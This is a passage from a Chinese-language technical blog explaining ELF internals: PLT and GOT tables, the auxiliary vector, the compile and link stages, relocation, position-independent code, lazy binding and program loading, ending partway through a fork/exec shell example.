                > PLT 表的形式如下所示： <span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>PLT0:</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mspace width="2em"/><mtext>push *(GOT+8)</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mspace width="2em"/><mtext>jmp *(GOT+16)</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mspace width="2em"/><mi><mi mathvariant="normal">⋮</mi><mpadded height="0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>bar@PLT:</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mspace width="2em"/><mtext>jmp *(bar@GOT)</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mspace width="2em"/><mtext>push n</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mspace width="2em"/><mtext>jmp PLT0</mtext></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">
\begin{align*}
&amp;  \text{PLT0:} \\
&amp;  \qquad  \text{push *(GOT+8)} \\
&amp;  \qquad \text{jmp *(GOT+16)} \\
&amp; \qquad  \vdots \\
&amp; \text{bar@PLT:} \\
&amp;  \qquad \text{jmp *(bar@GOT)} \\
&amp; \qquad \text{push n} \\
&amp; \qquad \text{jmp PLT0} \\
\end{align*}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:12.66em;vertical-align:-6.08em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:6.58em;"><span style="top:-9.24em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-7.74em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-6.24em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-4.08em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-2.58em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-1.08em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:0.42em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:1.92em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:6.08em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:6.58em;"><span style="top:-9.4275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">PLT0:</span></span></span></span><span style="top:-7.9275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:2em;"></span><span class="mord text"><span class="mord">push *(GOT+8)</span></span></span></span><span style="top:-6.4275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:2em;"></span><span class="mord text"><span class="mord">jmp *(GOT+16)</span></span></span></span><span style="top:-4.2675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:2em;"></span><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.7675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">bar@PLT:</span></span></span></span><span style="top:-1.2675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:2em;"></span><span class="mord text"><span class="mord">jmp *(bar@GOT)</span></span></span></span><span style="top:0.2325em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:2em;"></span><span class="mord text"><span class="mord">push n</span></span></span></span><span style="top:1.7325em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:2em;"></span><span class="mord text"><span class="mord">jmp PLT0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:6.08em;"><span></span></span></span></span></span></span></span></span></span></span></span>
其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 为函数 <code>bar</code> 在 GOT
表中的值的索引，<code>bar@GOT</code> 中初始值为
<code>jmp *(bar@GOT)</code> 指令的下一条指令，也就是说第一次调用
<code>bar</code> 函数的时候会继续执行跳转至 <code>PLT0</code> 进行
<code>bar@GOT</code> 的重定位并调用 <code>bar</code> 函数；第二次调用
<code>bar</code> 函数的时候由于 <code>bar@GOT</code>
已完成重定位因此会直接跳转至 <code>bar</code> 函数。</p>
<p>在开启 FULL RELRO 的情况下 PLT 表的结构如下图所示，此时的 PLT 表在
<code>.plt.sec</code> 而不是 <code>.plt</code> 中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241108002437068.png"
                     
alt="image-20241108002437068" 
                > 由于 GOT
表在装载时已经完成重定位且不可写，因此不存在延迟绑定，PLT 直接根据 GOT
表存储的函数地址进行跳转。</p>
<h3 id="got-表.got.got.plt">GOT 表（.got/.got.plt）</h3>
<p>ELF 将 GOT 拆分成了两个表叫做 <code>.got</code> 和
<code>.got.plt</code> 。其中 <code>.got</code>
用来保存全局变量引用的地址，<code>.got.plt</code>
用来保存函数引用的地址，也就是说，所有对于外部函数的引用全部被分离出来放到了
<code>.got.plt</code> 中（当然有的 ELF 文件可能吧这两个表合并为一个
<code>.got</code> 表，结构等同于后面提到的 <code>.got.plt</code>）。另外
<code>.got.plt</code>
还有一个特殊的地方是它的前三项是有特殊意义的，分别含义如下： -
第一项保存的是 <code>.dynamic</code> 段的偏移（也有可能是
<code>.dynamic</code> 段的地址）。 - 第二项是一个 <code>link_map</code>
的结构体指针，里面保存着动态链接的一些相关信息，是重定位函数
<code>_dl_runtime_resolve</code> 的第一个参数。 - 第三项保存的是
<code>_dl_runtime_resolve</code> 的地址。</p>
<p><code>.got.plt</code> 在内存中的状态如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241108003009195.png"
                      
                ></p>

  <div class="note p-4 mb-4 rounded-small red info">
    <p>注意：静态链接程序也是有 plt 表和 got 表的，并且 plt
表也会被调用。</p>

  </div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241108003049464.png"
                      
                ></p>
<h3 id="辅助信息数组">辅助信息数组</h3>
<p><strong>无论静态还是动态链接程序都有辅助信息数组，只是动态链接程序是动态链接器使用辅助信息数组。</strong></p>
<p>站在动态链接器的角度看，当操作系统把控制权交给它的时候，它将开始做链接工作，那么至少它需要知道关于可执行文件和本进程的一些信息，比如可执行文件有几个段（“Segment”）、每个段的属性、程序的入口地址（因为动态链接器到时候需要把控制权交给可执行文件）等。</p>
<p>这些信息往往由操作系统传递给动态链接器，保存在进程的堆栈里面。我们在前面提到过，进程初始化的时候，事实上，堆栈里面还保存了动态链接器所需要的一些辅助信息数组（Auxiliary
Vector）。辅助信息的格式也是一个结构数组，它的结构被定义在
<code>elf.h</code> ： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint32_t</span> a_type;		<span class="comment">/* Entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">uint32_t</span> a_val;		<span class="comment">/* Integer value */</span></span><br><span class="line">      <span class="comment">/* We use to have pointer elements added here.  We cannot do that,</span></span><br><span class="line"><span class="comment">	 though, since it does not work when using 32-bit definitions</span></span><br><span class="line"><span class="comment">	 on 64-bit platforms and vice versa.  */</span></span><br><span class="line">    &#125; a_un;</span><br><span class="line">&#125; Elf32_auxv_t;</span><br></pre></td></tr></table></figure></div> - <code>a_type</code>
字段表示辅助信息数组的类型。下面是一些常见的 <code>a_type</code>
值及其对应的含义： -
<code>AT_NULL (0)</code>：辅助向量列表的结束标志。在列表的最后一个条目中使用。
-
<code>AT_IGNORE (1)</code>：忽略的辅助向量类型。在某些情况下，可以将该类型的辅助向量忽略。
-
<code>AT_EXECFD (2)</code>：可执行文件的文件描述符。表示打开可执行文件的文件描述符。
-
<code>AT_PHDR (3)</code>：程序头表的地址。指向程序头表在内存中的起始地址。
-
<code>AT_PHENT (4)</code>：程序头表中每个条目的大小（字节）。指示每个程序头表条目的字节数。
-
<code>AT_PHNUM (5)</code>：程序头表的条目数量。指示程序头表中的条目数量。
- <code>AT_PAGESZ (6)</code>：页面大小。表示操作系统使用的页面大小。 -
<code>AT_BASE (7)</code>：共享对象的基地址。指向主共享对象的基地址。 -
<code>AT_FLAGS (8)</code>：标志位。包含一些特定于操作系统的标志。 -
<code>AT_ENTRY (9)</code>：程序入口点的地址。指向程序的入口点地址。 -
<code>AT_NOTELF (10)</code>：不是ELF文件。指示加载程序的文件不是有效的ELF文件。
-
<code>a_un</code>：该成员是一个联合体（union），用于存储辅助向量条目的值。在这段代码中，由于指针类型的元素会在
32 位和 64 位平台上产生兼容性问题，所以注释中提到不再添加指针元素。 -
<code>a_val</code>：如果辅助向量条目的类型是一个整数值，那么该成员将存储该整数值。它也是一个
32 位的无符号整数。 # 程序编译过程 从源文件编译链接形成 ELF
文件的过程如下图所示：</p>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241108004250085.png"
                     
alt="image-20241108004250085" 
                >
<figcaption aria-hidden="true">image-20241108004250085</figcaption>
</figure>
<h2 id="预编译">预编译</h2>
<p>首先是源代码文件和相关的头文件，如 <code>stdio.h</code> 等被预编译器
cpp 预编译成一个 <code>.i</code> 文件。对于 C++
程序来说，它的源代码文件的扩展名可能是 <code>.cpp</code> 或
<code>.cxx</code> ，头文件的扩展名可能是 <code>.hpp</code>
，而预编译后的文件扩展名是 <code>.ii</code> 。</p>
<p>第一步预编译的过程相当于如下命令（<code>-E</code>
表示只进行预编译）： <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gcc –E hello.c –o hello.i</span><br></pre></td></tr></table></figure></div> 或者： <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">cpp hello.c &gt; hello.i</span><br></pre></td></tr></table></figure></div>
预编译过程主要处理那些源代码文件中的以 <code>#</code>
开始的预编译指令。比如 <code>#include</code> 、<code>#define</code>
等，主要处理规则如下： - 将所有的 <code>#define</code>
删除，并且展开所有的宏定义。 - 处理所有条件预编译指令，比如
<code>#if</code> 、<code>#ifdef</code> 、<code>#elif</code>
、<code>#else</code> 、<code>#endif</code> 。 - 处理
<code>#include</code>
预编译指令，将被包含的文件插入到该预编译指令的位置。注意，这个过程是递归进行的，也就是说被包含的文件可能还包含其他文件。
- 删除所有的注释 <code>//</code> 和 <code>/* */</code> 。 -
添加行号和文件名标识，比如 <code>#2"hello.c"2</code>
，以便于编译时编译器产生调试用的行号信息及用于编译时产生编译错误或警告时能够显示行号。
- 保留所有的 <code>#pragma</code>
编译器指令，因为编译器须要使用它们。</p>
<p>经过预编译后的 <code>.i</code>
文件不包含任何宏定义，因为所有的宏已经被展开，并且包含的文件也已经被插入到
<code>.i</code>
文件中。所以当我们无法判断宏定义是否正确或头文件包含是否正确时，可以查看预编译后的文件来确定问题。
## 编译
编译过程就是把预处理完的文件进行一系列词法分析、语法分析、语义分析及优化后生产相应的汇编代码文件，这个过程往往是我们所说的整个程序构建的核心部分，也是最复杂的部分之一。</p>
<p>上面的编译过程相当于如下命令： <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gcc –S hello.i –o hello.s</span><br></pre></td></tr></table></figure></div> ## 汇编
汇编器是将汇编代码转变成机器可以执行的指令，每一个汇编语句几乎都对应一条机器指令。所以汇编器的汇编过程相对于编译器来讲比较简单，它没有复杂的语法，也没有语义，也不需要做指令优化，只是根据汇编指令和机器指令的对照表一一翻译就可以了，“汇编”这个名字也来源于此。</p>
<p>上面的汇编过程我们可以调用汇编器 as 来完成： <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">as hello.s –o hello.o</span><br></pre></td></tr></table></figure></div> 或者使用
gcc 命令从 C
源代码文件开始，经过预编译、编译和汇编直接输出目标文件（Object File）：
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gcc –c hello.c –o hello.o</span><br></pre></td></tr></table></figure></div> # 链接 ## 静态链接
静态链接是在编译过程的最后阶段将多个目标文件（如 <code>.o</code>
文件）以及所需的库文件合并在一起，生成最终的可执行文件或共享库的过程。</p>
<p>可以使用如下命令将 <code>a.o</code> 和 <code>b.o</code>
链接为目标文件 ab 。 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ld a.o b.o -o ab</span><br></pre></td></tr></table></figure></div> ### 合并代码和数据段（Code and Data
Segment Merging）
链接器将多个目标文件中的代码段和数据段合并成一个更大的代码段和数据段。这样，所有的目标文件中的代码和数据都会被整合到最终的可执行文件或静态库中。
### 符号解析（Symbol Resolution）
链接器负通过<strong>重定位表</strong>解析目标文件中的符号引用。每个目标文件都包含对其他目标文件或库中定义的符号的引用，例如函数、变量等。链接器会检查这些引用并确定对应的定义位置。</p>
<p>对于可重定位的 ELF
文件来说，它必须包含有重定位表，用来描述如何修改相应的段里的内容。对于每个要被重定位的
ELF 段都有一个对应的重定位表，而一个重定位表往往就是 ELF
文件中的一个段，所以其实重定位表也可以叫重定位段。</p>
<p>比如代码段 <code>.text</code>
如有要被重定位的地方，那么会有一个相对应叫 <code>.rel.text</code>
的段保存了代码段的重定位表；如果代码段 <code>.data</code>
有要被重定位的地方，就会有一个相对应叫 <code>.rel.data</code>
的段保存了数据段的重定位表。</p>
<p>链接器通过 <code>Elf32_Rel</code> 的 <code>r_offset</code>
加上所在段的起始位置得到<strong>重定位入口的位置</strong>；通过
<code>r_info</code> 的低 8 为得知<strong>重定位类型</strong>；通过
<code>r_info</code> 的高 24
位得到重定位符号在符号表（<code>.symtab</code>）中的下标。 ###
符号重定位（Symbol Relocation） 链接器通过符号表对应的
<code>Elf32_Rel</code> 的 <code>st_value</code>
表示该符号在段中的<strong>偏移</strong>，进而可以根据<strong>重定位类型</strong>计算出重定位入口所要修正的值。最后将对应的重定位入口
patch 成正确的值。32 位静态链接常用到的重定位类型如下： -
<code>R_386_32</code>：绝对地址。 -
<code>R_386_PC32</code>：相对于当前指令地址的下一条指令相对地址。 ###
解析库依赖关系（Library Dependency Resolution）
如果目标文件依赖于外部库文件（如标准库或其他第三方库），链接器会解析这些库的依赖关系，并将所需的库文件链接到最终的可执行文件或静态库中。这样，在运行时，可执行文件或静态库就能够访问和使用这些库中提供的功能。
### 生成重定位表（Relocation Table）
链接器生成重定位表，记录了需要进行符号重定位的位置和相关信息。这些重定位表将在最终的可执行文件或静态库中被使用，以便在加载和执行时进行正确的符号重定位。
## 动态链接 动态链接（Dynamic
Linking）本质是指把链接这个过程推迟到了运行时再进行，准确的说这个过程应该放在装载部分。不过动态链接的出现很大一部分原因是为了解决内存浪费问题，因此直接照搬静态链接的方式不合理，需要做一些改变。</p>
<p>另外我们称一个程序为动态链接程序或静态链接程序指的是该程序是否有动态链接过程。</p>
<p><strong>注意动态链接不包括合并代码和数据段的过程，各个模块在内存中独立存在。</strong>
### 装载时重定位
由于需要将多个模块装载到内存中，因此动态链接难免会有地址冲突问题，这就需要我们在加载的时候将模块中的相关地址修改为正确的值，这就是装载时重定位。</p>
<p>Linux和GCC支持这种装载时重定位的方法，在产生共享对象时，使用了两个GCC参数
<code>-shared</code> 和 <code>-fPIC</code> ，如果只使用
<code>-shared</code> ，那么输出的共享对象就是使用装载时重定位的方法。
### 地址无关代码
如果采用装载时重定位的方法虽然能够做到任意地址装载，但存在弊端。比如模块装载到不同位置会导致模块的代码段内容发生改变，无法实现共享库的复用，造成内存浪费；每次装载重定位会影响性能等。</p>
<p>地址无关代码的出现很好的解决了装载时重定位的缺点。地址无关代码的基本想法就是把指令中那些需要被修改的部分分离出来，跟数据部分放在一起，这样指令部分就可以保持不变，而数据部分可以在每个进程中拥有一个副本。这种方案就是目前被称为地址无关代码（PIC,Position-independent
Code）的技术。这也就是 GCC 的 <code>-fPIC</code> 编译参数。</p>
<p>模块中各种类型的地址引用方式有以下 4 种： -
模块内部的函数调用、跳转等。 -
模块内部的数据访问，比如模块中定义的全局变量、静态变量。 -
模块外部的函数调用、跳转等。 -
模块外部的数据访问，比如其他模块中定义的全局变量。</p>
<p>对于前两种引用方式由于是在模块内部，相对地址偏移固定，因此可以通过
<code>[rip + xxx]</code> （注意这里的 rip
是当前指令的<strong>下一条指令</strong>的地址，下一条指令指的是<strong>地址相邻</strong>的下一条指令）的方式进行引用，从而做到地址无关。因此关键在于后两种怎么解决。</p>
<p>模块间的访问比模块内部稍微麻烦一点，因为模块间的数据访问目标地址要等到装载时才决定，我们前面提到要使得代码地址无关，基本的思想就是把跟地址相关的部分放到数据段里面，很明显，这些其他模块的全局变量的地址是跟模块装载地址有关的。ELF
的做法是在数据段里面建立一个指向这些变量的指针数组，也被称为全局偏移表（Global
Offset Table，GOT），当代码需要引用该全局变量时，可以通过 GOT
中相对应的项间接引用。</p>
<p>前面模块内部的解决方法实际上并不严谨，比如一些全局变量以及函数声明没有初始化会被认为是若弱符号，这些弱符号编译器并不知道是否只在本模块定义，因此不能仅使用
<code>[rip + xxx]</code> 的方式访问。</p>
<p>针对这种情况的解决办法是所有的使用这个变量的指令都指向位于可执行文件中的那个副本。ELF
共享库在编译时，默认都把定义在模块内部的全局变量当作定义在其他模块的全局变量，也就是说当作前面的类型四，通过
GOT
来实现变量的访问。当共享模块被装载时，如果某个全局变量在可执行文件中拥有副本，那么动态链接器就会把
GOT
中的相应地址指向该副本，这样该变量在运行时实际上最终就只有一个实例。如果变量在共享模块中被初始化，那么动态链接器还需要将该初始化值复制到程序主模块中的变量副本；如果该全局变量在程序主模块中没有副本，那么
GOT 中的相应地址就指向共享模块内部的该变量副本。<strong>这就是为什么
libc 的 GOT 表中会有自身函数。</strong></p>
<p>地址无关代码虽然解决了模块复用的问题，但是本质还是装载时重定位因此没有解决性能问题，实际上
ELF 采用了<strong>延迟绑定</strong>的方法来解决这一问题。</p>
<p>地址无关代码技术除了可以用在共享对象上面，它也可以用于<strong>可执行文件</strong>，一个以地址无关方式编译的可执行文件被称作地址无关可执行文件（<strong>PIE</strong>,
Position-Independent Executable）。与 GCC 的 <code>-fPIC</code> 和
<code>-fpic</code> 参数类似，产生 PIE 的参数为 <code>-fPIE</code> 或
<code>-fpie</code> 。</p>
<h3 id="延迟绑定">延迟绑定</h3>
<p>在动态链接下，程序模块之间包含了大量的函数引用（全局变量往往比较少，因为大量的全局变量会导致模块之间耦合度变大），所以在程序开始执行前，动态链接会耗费不少时间用于解决模块之间的函数引用的符号查找以及重定位。可以想象，在一个程序运行过程中，可能很多函数在程序执行完时都不会被用到，比如一些错误处理函数或者是一些用户很少用到的功能模块等，如果一开始就把所有函数都链接好实际上是一种浪费。所以
ELF 采用了一种叫做延迟绑定（Lazy
Binding）的做法，基本的思想就是当函数第一次被用到时才进行绑定（符号查找、重定位等），如果没有用到则不进行绑定。所以程序开始执行时，模块间的函数调用都没有进行绑定，而是需要用到时才由动态链接器来负责绑定。这样的做法可以大大加快程序的启动速度，特别有利于一些有大量函数引用和大量模块的程序。</p>
<p><strong>注意，延迟绑定一般只出先在未开启 FULL RELRO 的时候，如果开启
FULL RELRO 则 got 表不可写，程序在装载时完成 got
表的重定位。当然特殊情况也有在开启 FULL RELRO 的时候进行重定位，比如
ret2dlresolve 。</strong></p>
<p>我们以调用 <code>puts</code> 函数为例讲解一下延迟绑定的过程。</p>
<p>首先第一次调用 <code>puts</code> 时由于 <code>puts@got</code>
没有进行重定位，因此会调用 <code>_dl_runtime_resolve</code>
函数进行重定位，<code>_dl_runtime_resolve</code> 函数将查找到的
<code>puts</code> 函数地址填写到 <code>puts@got</code> 后会调用
<code>puts</code> 函数。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241108004319385.png"
                     
alt="image-20241108004319385" 
                > 再次调用 <code>puts</code> 函数时由于
<code>puts@got</code> 已经完成重定位，因此会直接调用 <code>puts</code>
函数。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241108004343509.png"
                     
alt="image-20241108004343509" 
                > 其中在第一次调用 <code>puts</code>
函数时调用的 <code>_dl_runtime_resolve</code> 函数的具体实现为：</p>
<ul>
<li>用第一个参数 <code>link_map</code> 访问 <code>.dynamic</code> ，取出
<code>.dynstr</code> ， <code>.dynsym</code> ， <code>.rel.plt</code>
的指针。</li>
<li><code>.rel.plt + 第二个参数</code> 求出当前函数的重定位表项
<code>Elf32_Rel</code> 的指针，记作 <code>rel</code> 。</li>
<li><code>rel-&gt;r_info &gt;&gt; 8</code> 作为 <code>.dynsym</code>
的下标，求出当前函数的符号表项 <code>Elf32_Sym</code> 的指针，记作
<code>sym</code> 。</li>
<li><code>.dynstr + sym-&gt;st_name</code> 得出符号名字符串指针。</li>
<li>在动态链接库查找这个函数的地址，并且把地址赋值给
<code>*rel-&gt;r_offset</code> ，即 GOT 表。</li>
<li>调用这个函数。 ### 动态链接的步骤和实现 #### 动态链接器自举
由于动态链接器本身的作用是重定位，因此自身的重定位也需要自身来完成，完成自身重定位的过程成为自举（Bootstrap）。</li>
</ul>
<p>动态链接器入口地址即是自举代码的入口，当操作系统将进程控制权交给动态链接器时，动态链接器的自举代码即开始执行。自举代码首先会找到它自己的
GOT 。而 GOT 的第一个入口保存的即是 <code>.dynamic</code>
段的偏移地址，由此找到了动态连接器本身的“.dynamic”段。通过
<code>.dynamic</code>
中的信息，自举代码便可以获得动态链接器本身的重定位表和符号表等，从而得到动态链接器本身的重定位入口，先将它们全部重定位。</p>
<p>从这一步开始，动态链接器代码中才可以开始使用自己的全局变量和静态变量。
#### 装载共享对象
完成基本自举以后，动态链接器将可执行文件和链接器本身的符号表都合并到一个符号表当中，我们可以称它为全局符号表（Global
Symbol
Table）。然后链接器开始寻找可执行文件所依赖的共享对象，我们前面提到过
<code>.dynamic</code> 段中，有一种类型的入口是 <code>DT_NEEDED</code>
，它所指出的是该可执行文件（或共享对象）所依赖的共享对象。由此，链接器可以列出可执行文件所需要的所有共享对象，并将这些共享对象的名字放入到一个装载集合中。然后链接器开始从集合里取一个所需要的共享对象的名字，找到相应的文件后打开该文件，读取相应的
ELF 文件头和 <code>.dynamic</code>
段，然后将它相应的代码段和数据段映射到进程空间中。</p>
<p>如果这个 ELF
共享对象还依赖于其他共享对象，那么将所依赖的共享对象的名字放到装载集合中。如此循环直到所有依赖的共享对象都被装载进来为止，当然链接器可以有不同的装载顺序，如果我们把依赖关系看作一个图的话，那么这个装载过程就是一个图的遍历过程，链接器可能会使用深度优先或者广度优先或者其他的顺序来遍历整个图，这取决于链接器，比较常见的算法一般都是广度优先的。</p>
<p>当一个新的共享对象被装载进来的时候，它的符号表会被合并到全局符号表中，所以当所有的共享对象都被装载进来的时候，全局符号表里面将包含进程中所有的动态链接所需要的符号。
#### 重定位和初始化
当上面的步骤完成之后，链接器开始重新遍历可执行文件和每个共享对象的重定位表，将它们的
GOT/PLT
中的每个需要重定位的位置进行修正。因为此时动态链接器已经拥有了进程的全局符号表，所以这个修正过程也显得比较容易，跟我们前面提到的地址重定位的原理基本相同。</p>
<p>动态链接重定位除了前面静态链接重定位类型外还有如下重定位类型： -
<code>R_386_RELATIVE</code>：针对下面这种代码的重定位，由于加载地址不确定，需要加载后的才能确定。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> a;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span>* p = &amp;a;</span><br></pre></td></tr></table></figure></div> - <code>R_386_GLOB_DAT</code>：位于 <code>.got</code>
的重定位入口，只需要填入正确变量地址即可。 -
<code>R_386_JUMP_SLOT</code>：位于 <code>.got.plt</code>
的重定位入口，只需要填入正确的函数地址即可。</p>
<p>重定位完成之后，如果某个共享对象有 <code>.init</code>
段，那么动态链接器会执行 <code>.init</code>
段中的代码，用以实现共享对象特有的初始化过程，比如最常见的，共享对象中的
C++ 的全局/静态对象的构造就需要通过 <code>.init</code>
来初始化。相应地，共享对象中还可能有 <code>.fini</code>
段，当进程退出时会执行 <code>.fini</code> 段中的代码，可以用来实现类似
C++ 全局对象析构之类的操作。</p>
<p>如果进程的可执行文件也有 <code>.init</code>
段，那么动态链接器不会执行它，因为可执行文件中的 <code>.init</code> 段和
<code>.fini</code>
段由程序初始化部分代码负责执行。当完成了重定位和初始化之后，所有的准备工作就宣告完成了，所需要的共享对象也都已经装载并且链接完成了，这时候动态链接器就如释重负，将进程的控制权转交给程序的入口并且开始执行。
# 装载 ## Linux 内核装载 ELF 过程 首先在用户层面，bash 进程会调用
<code>fork()</code> 系统调用创建一个新的进程，然后新的进程调用
<code>execve()</code> 系统调用执行指定的 ELF 文件，原先的 bash
进程继续返回等待刚才启动的新进程结束，然后继续等待用户输入命令。</p>
<p><code>execve()</code> 系统调用被定义在 <code>unistd.h</code>
，它的原型如下： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Replace the current process, executing PATH with arguments ARGV and</span></span><br><span class="line"><span class="comment">   environment ENVP.  ARGV and ENVP are terminated by NULL pointers.  */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">execve</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *__path, <span class="type">char</span> *<span class="type">const</span> __argv[], <span class="type">char</span> *<span class="type">const</span> __envp[])</span>;</span><br></pre></td></tr></table></figure></div>
它的三个参数分别是被执行的程序文件名、执行参数和环境变量。</p>
<p>Glibc 对 <code>execvp()</code> 系统调用进行了包装，提供了
<code>execl()</code> 、<code>execlp()</code> 、<code>execle()</code>
、<code>execv()</code> 和 <code>execvp()</code> 等5个不同形式的
<code>exec</code> 系列 API
，它们只是在调用的参数形式上有所区别，但最终都会调用到
<code>execve()</code> 这个系统调用。下面是一个简单的使用
<code>fork()</code> 和 <code>execlp()</code> 实现的 minibash ：
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_COMMAND_LENGTH 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> command[MAX_COMMAND_LENGTH];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;minibash$ &quot;</span>);</span><br><span class="line">        fgets(command, <span class="keyword">sizeof</span>(command), <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 